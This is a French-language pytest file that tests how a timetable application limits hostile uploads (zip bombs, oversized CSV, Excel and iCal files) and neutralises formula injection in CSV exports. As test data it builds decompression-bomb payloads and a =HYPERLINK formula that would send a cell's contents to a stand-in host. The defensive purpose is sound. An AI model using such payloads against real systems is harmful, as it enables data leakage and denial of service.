"""Bornes contre les fichiers hostiles (site public) et corrections de la revue d'ensemble.

Chaque constat bloquant est reproduit (archive bombe, fichier trop long,
page qui gèle le serveur) et le refus propre est vérifié.
"""

from __future__ import annotations

import asyncio
import csv
import datetime as dt
import io
import threading
import time
import zipfile

import httpx
from sqlalchemy import select

from edt.db import modeles as m
from edt.db.moteur import session_base
from edt.domaine.enumerations import Gravite, OrigineVersion
from edt.echange import ical, lecture
from edt.echange.lecture import FichierEnvoye, Limites, lire_fichier
from edt.echange.rapport import ListeSignalements, RapportImport, Signalement, rapport_csv
from edt.services import echange as service
from edt.services.echange import ModeImport

HTMX = {"HX-Request": "true"}


def _zip(membres: dict[str, bytes]) -> bytes:
    tampon = io.BytesIO()
    with zipfile.ZipFile(tampon, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for nom, contenu in membres.items():
            archive.writestr(nom, contenu)
    return tampon.getvalue()


def _erreurs(signalements) -> list[str]:
    return [s.message for s in signalements if s.gravite is Gravite.ERREUR]


# --------------------------------------------------------------------------- #
# Constat 2 : archive bombe
# --------------------------------------------------------------------------- #


def test_archive_bombe_refusee_avant_decompression():
    """40 Ko qui feraient 21 Mo de retours à la ligne une fois décompressés."""
    bombe = _zip({"salles.csv": b"code;campus\n" + b"\n" * (21 * 1024 * 1024)})
    assert len(bombe) < 100 * 1024

    debut = time.perf_counter()
    lu, signalements = lire_fichier(FichierEnvoye("bombe.zip", bombe))

    assert time.perf_counter() - debut < 2
    assert lu.tableaux == ()
    (message,) = _erreurs(signalements)
    assert "Archive ZIP refusé" in message and "décompressé" in message and "20 Mo" in message


def test_archive_de_plus_de_50_fichiers_refusee():
    archive = _zip({f"salles_{i}.csv": b"code;campus\nN1;NDC\n" for i in range(51)})
    lu, signalements = lire_fichier(FichierEnvoye("trop.zip", archive))
    assert lu.tableaux == ()
    assert "51 fichiers" in _erreurs(signalements)[0]


def test_membre_abime_signale_sans_planter():
    contenu = _zip(
        {"campus.csv": b"code;nom\n" + b"NDC;Notre-Dame\n" * 200, "salles.csv": b"code\n"}
    )
    abime = bytearray(contenu)
    position = abime.index(b"campus.csv") + len("campus.csv") + 10  # dans les données compressées
    abime[position] ^= 0xFF
    lu, signalements = lire_fichier(FichierEnvoye("abime.zip", bytes(abime)))
    assert any("illisible" in m for m in _erreurs(signalements))
    assert [t.nom for t in lu.tableaux] == ["salles.csv"]  # le membre sain est lu


def test_classeur_bombe_refuse_avant_openpyxl():
    bombe = _zip(
        {
            "[Content_Types].xml": b"<Types/>",
            "xl/workbook.xml": b"<workbook/>",
            "xl/sharedStrings.xml": b"<sst>" + b" " * (21 * 1024 * 1024) + b"</sst>",
        }
    )
    lu, signalements = lire_fichier(FichierEnvoye("bombe.xlsx", bombe))
    assert lu.tableaux == ()
    assert "Classeur Excel refusé" in _erreurs(signalements)[0]


def test_le_gabarit_reste_sous_les_bornes_d_un_classeur(base):
    with session_base() as session:
        gabarit = service.produire_gabarit(session, "xlsx")
    with zipfile.ZipFile(io.BytesIO(gabarit.contenu)) as archive:
        assert len(archive.infolist()) <= lecture.MAX_MEMBRES_CLASSEUR
    lu, signalements = lire_fichier(FichierEnvoye(gabarit.nom, gabarit.contenu))
    assert _erreurs(signalements) == [] and len(lu.tableaux) == 13


def test_import_web_d_une_archive_bombe(base, client):
    bombe = _zip({"salles.csv": b"code;campus\n" + b"\n" * (21 * 1024 * 1024)})
    reponse = client.post(
        "/import/simuler",
        headers=HTMX,
        files=[("fichiers", ("bombe.zip", bombe, "application/zip"))],
        data={"mode": "donnees"},
    )
    assert reponse.status_code == 200
    assert "Archive ZIP refusé" in reponse.text
    assert len(reponse.content) < 200 * 1024


# --------------------------------------------------------------------------- #
# Constat 3 : fichier trop long, page géante, boucle d'événements gelée
# --------------------------------------------------------------------------- #


def test_fichier_de_retours_a_la_ligne_refuse_sans_tout_lire():
    """19 Mo de lignes vides : la lecture s'arrête à 100 000 lignes lues."""
    texte = b"libelle;date_debut;date_fin\n" + b"\n" * (19 * 1024 * 1024)
    debut = time.perf_counter()
    lu, signalements = lire_fichier(FichierEnvoye("annees.csv", texte))
    assert time.perf_counter() - debut < 5
    assert lu.tableaux == ()
    assert f"plus de {lecture.MAX_LIGNES_LUES} lignes" in _erreurs(signalements)[0]


def test_tableau_trop_long_refuse_avec_un_message_clair():
    lignes = "".join(f"A{i};x;y\n" for i in range(lecture.MAX_LIGNES_TABLEAU + 1))
    lu, signalements = lire_fichier(
        FichierEnvoye("annees.csv", ("libelle;a;b\n" + lignes).encode())
    )
    assert lu.tableaux == ()
    (message,) = _erreurs(signalements)
    assert f"plus de {lecture.MAX_LIGNES_TABLEAU} lignes de données" in message
    assert "Découper" in message


def test_budget_de_lignes_partage_par_l_envoi():
    limites = Limites(lignes_restantes=5)
    premier, _ = lire_fichier(FichierEnvoye("a.csv", b"code;nom\n" + b"A;a\n" * 3), limites)
    second, signalements = lire_fichier(
        FichierEnvoye("b.csv", b"code;nom\n" + b"B;b\n" * 3), limites
    )
    assert len(premier.tableaux[0].lignes) == 3
    assert second.tableaux == () and "au total" in _erreurs(signalements)[0]


def test_trop_de_colonnes_et_cellule_geante():
    large = lire_fichier(FichierEnvoye("x.csv", b"code;nom\n" + b";" * 600 + b"z\n"))
    assert "colonnes" in _erreurs(large[1])[0]
    geante = lire_fichier(FichierEnvoye("x.csv", b'code;nom\nA;"' + b"x" * 200_000 + b'"\n'))
    assert "CSV illisible" in _erreurs(geante[1])[0]


def test_ical_trop_d_evenements_ou_regle_trop_dense(monkeypatch):
    evenement = "BEGIN:VEVENT\nUID:{0}\nDTSTAMP:20260901T000000Z\nDTSTART:20261005T083000\nDTEND:20261005T103000\n{1}END:VEVENT\n"
    texte = "BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//t//FR\n{}END:VCALENDAR\n"
    monkeypatch.setattr(ical, "MAX_EVENEMENTS", 2)
    seances, signalements = ical.lire_ical(
        "a.ics", texte.format("".join(evenement.format(i, "") for i in range(3)))
    )
    assert seances == [] and "3 événements" in _erreurs(signalements)[0]

    dense = texte.format(evenement.format("m", "RRULE:FREQ=MINUTELY\n"))
    seances, signalements = ical.lire_ical(
        "b.ics", dense, (dt.date(2026, 9, 7), dt.date(2027, 1, 29))
    )
    assert seances == [] and "trop d'occurrences" in _erreurs(signalements)[0]


def test_signalements_bornes_et_comptes():
    liste = ListeSignalements(maximum=2)
    liste.extend(Signalement(Gravite.ERREUR, f"ligne {i}") for i in range(5))
    liste.append(Signalement(Gravite.INFORMATION, "info"))
    assert len(liste) == 2 and (liste.omis, liste.erreurs_omises) == (4, 3)
    rapport = RapportImport(
        "donnees", True, ("a.csv",), (), tuple(liste), signalements_omis=4, erreurs_omises=3
    )
    assert rapport.nb_signalements == 6 and rapport.nb_erreurs == 5 and rapport.a_des_rejets
    assert "4 autre(s) signalement(s) non détaillé(s), dont 3 erreur(s)" in rapport_csv(
        rapport
    ).decode("utf-8-sig")


def test_page_bornee_et_rapport_complet_telechargeable(jeu_minimal, client):
    lignes = "".join(f"{i};pas une date;y\n" for i in range(1500))
    envoi = {
        "files": [
            (
                "fichiers",
                ("annees.csv", ("libelle;date_debut;date_fin\n" + lignes).encode(), "text/csv"),
            )
        ],
        "data": {"mode": "donnees"},
    }

    page = client.post("/import/simuler", headers=HTMX, **envoi)

    assert page.status_code == 200
    assert "3000 ligne(s), les 200 premières affichées" in page.text
    assert page.text.count("<tr>") < 260  # 200 signalements, le bilan et l'aperçu
    assert "data:text/csv" not in page.text

    rapport = client.post("/import/rapport.csv", **envoi)
    assert rapport.status_code == 200 and rapport.headers["content-type"].startswith("text/csv")
    lignes_rapport = list(
        csv.reader(io.StringIO(rapport.content.decode("utf-8-sig")), delimiter=";")
    )
    assert sum(1 for ligne in lignes_rapport if ligne[0] == "erreur") == 3000


def test_fichier_de_19_mo_refuse_vite_par_le_web(base, client):
    """Le scénario de la revue : annees.csv de 19,5 Mo, 1 200 000 lignes invalides."""
    contenu = b"libelle;date_debut;date_fin\n" + b"x;pas une date;y\n" * 1_200_000
    assert len(contenu) < service.TAILLE_MAX_OCTETS
    debut = time.perf_counter()
    reponse = client.post(
        "/import/simuler",
        headers=HTMX,
        files=[("fichiers", ("annees.csv", contenu, "text/csv"))],
        data={"mode": "donnees"},
    )
    assert time.perf_counter() - debut < 15
    assert reponse.status_code == 200 and len(reponse.content) < 200 * 1024
    assert f"plus de {lecture.MAX_LIGNES_TABLEAU} lignes de données" in reponse.text


def test_un_import_ne_gele_pas_les_autres_requetes(jeu_minimal, monkeypatch):
    """Pendant l'import ET le rendu de sa page, la boucle d'événements répond encore (/sante)."""
    from edt.web.app import creer_app
    from edt.web.routes import echange as routes

    entre, libere = threading.Event(), threading.Event()
    rendre = routes.rendre

    def rendu_lent(*arguments, **options):
        entre.set()
        assert libere.wait(10)
        return rendre(*arguments, **options)

    monkeypatch.setattr(routes, "rendre", rendu_lent)
    app = creer_app()

    async def scenario() -> tuple[int, int]:
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://essai") as client:
            envoi = client.post(
                "/import/simuler",
                files=[("fichiers", ("campus.csv", b"code;nom\nNDC;Notre-Dame\n", "text/csv"))],
                data={"mode": "donnees"},
            )
            tache = asyncio.ensure_future(envoi)
            assert await asyncio.to_thread(entre.wait, 10)
            sante = await asyncio.wait_for(client.get("/sante"), 5)
            assert not tache.done()  # le rendu attend encore, le site répond quand même
            libere.set()
            return sante.status_code, (await tache).status_code

    assert asyncio.run(scenario()) == (200, 200)


# --------------------------------------------------------------------------- #
# Constats 4 et 5
# --------------------------------------------------------------------------- #


def test_formules_neutralisees_dans_les_csv_et_relues_a_l_identique(
    jeu_minimal, importer, exporter
):
    formule = '=HYPERLINK("http://exemple.invalid/?x="&A1;"clic")'
    with session_base() as session:
        matiere = session.scalar(select(m.Matiere).where(m.Matiere.code == "IM.1101"))
        matiere.libelle = formule
        salle = session.scalar(select(m.Salle).where(m.Salle.code == "N016"))
        salle.etage = -1
    with session_base() as session:
        archive = service.exporter_donnees(session, "zip")
    with zipfile.ZipFile(io.BytesIO(archive.contenu)) as contenu:
        matieres = contenu.read("matieres.csv").decode("utf-8-sig")
        salles = contenu.read("salles.csv").decode("utf-8-sig")
    assert '" =HYPERLINK' in matieres and "\n=" not in matieres and ";=" not in matieres
    assert ";-1;" in salles  # un nombre négatif n'est pas une formule

    rapport = importer(FichierEnvoye(archive.nom, archive.contenu), simuler=True)
    assert rapport.bilan("matieres").compteurs == {"inchanges": 6}  # relu à l'identique
    assert any(x["libelle"] == formule for x in exporter()["matieres"])


def test_csv_d_emploi_du_temps_neutralise(version_generee):
    with session_base() as session:
        besoin = session.get(m.SeanceHebdo, 1).besoin
        besoin.libelle = "+33 SUM(A1)"
    with session_base() as session:
        fichier = service.exporter_emploi_du_temps(session, version_generee, "csv")
    assert " +33 SUM(A1)" in fichier.contenu.decode("utf-8-sig")


def test_export_preselectionne_la_version_active(version_generee, client, aujourdhui):
    with session_base() as session:
        s2 = session.scalar(select(m.Semestre).where(m.Semestre.code == "S2"))
        session.add(
            m.VersionEdt(
                semestre_id=s2.id,
                numero=1,
                libelle="Témoin du second semestre",
                origine=OrigineVersion.REFERENCE,
                active=False,
            )
        )
    with session_base() as session:
        choix = service.choix_export(session, aujourdhui)
    assert choix.versions[0][1].endswith("Témoin du second semestre")  # en tête de liste...
    assert choix.version_par_defaut == version_generee  # ...mais l'active est présélectionnée

    page = client.get("/export").text
    assert f'<option value="{version_generee}" selected>' in page


def test_import_d_emploi_du_temps_limite_aussi_l_ical(jeu_minimal, importer, monkeypatch):
    monkeypatch.setattr(ical, "MAX_EVENEMENTS", 1)
    texte = (
        "BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//t//FR\n"
        + "".join(
            f"BEGIN:VEVENT\nUID:{i}\nDTSTAMP:20260901T000000Z\nDTSTART:20261005T083000\n"
            "DTEND:20261005T103000\nEND:VEVENT\n"
            for i in range(2)
        )
        + "END:VCALENDAR\n"
    )
    rapport = importer(
        FichierEnvoye("agenda.ics", texte.encode()),
        mode=ModeImport.A_REPLACER,
        semestre_id=jeu_minimal.semestre_id,
        simuler=True,
    )
    assert rapport.a_des_rejets and "2 événements" in _erreurs(rapport.signalements)[0]
